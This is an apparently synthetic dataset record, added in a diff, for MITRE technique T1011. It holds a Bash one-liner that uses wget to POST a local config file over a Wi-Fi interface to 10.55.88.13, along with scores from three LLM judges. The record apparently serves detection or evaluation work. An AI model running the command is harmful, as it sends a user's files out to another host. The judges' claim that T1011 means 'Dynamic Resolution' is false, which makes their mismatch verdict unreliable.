@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "iwconfig wlan1 >/dev/null 2>&1 && wget --quiet --tries=1 --timeout=5 --bind-address=\"$(ip -4 addr show wlan1 | awk '/inet /{print $2}' | cut -d/ -f1)\" --post-file=/home/user/.config/cache.json http://10.55.88.13:49502/ingest",
+  "explanation": "Uses wget with --bind-address to force an HTTP POST over wlan1 to an uncommon port, aligning with T1011 by using a separate Wi\u2011Fi medium for exfiltration.",
+  "rationale_steps": [
+    "Check wlan1 status with iwconfig.",
+    "Bind the HTTP client to wlan1\u2019s IP ensuring the alternate medium is used.",
+    "POST the data to a high-numbered port to avoid common service patterns."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-621a2eda-c9a750ea",
+  "source_prompt_hash": "621a2eda",
+  "timestamp_utc": "2025-09-30T08:26:15.681023Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for iwconfig and wget, correct command chaining with &&, and proper command substitution using $() for the IP address extraction.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically valid for exfiltrating data over HTTP POST, it doesn't align with T1011 (Dynamic Resolution) as it uses a hardcoded IP address and port rather than algorithmically determining endpoints or using domain generation algorithms.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:04:46.983697Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced elements, valid flags, and proper command substitution.",
+        "semantic_score": 2,
+        "semantic_justification": "The command correctly performs exfiltration over a specific interface but misaligns with T1011, which focuses on dynamic resolution of the *destination* C2 endpoint, not dynamic selection of the *source* interface.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:04:58.689591Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quoting, valid wget flags, proper redirections, and correct command substitution.",
+        "semantic_score": 1,
+        "semantic_justification": "Uses a fixed IP and interface binding for HTTP POST, which does not involve dynamic resolution (no DGA, DNS, or endpoint rotation) and thus is not aligned with the described technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T07:05:11.465033Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
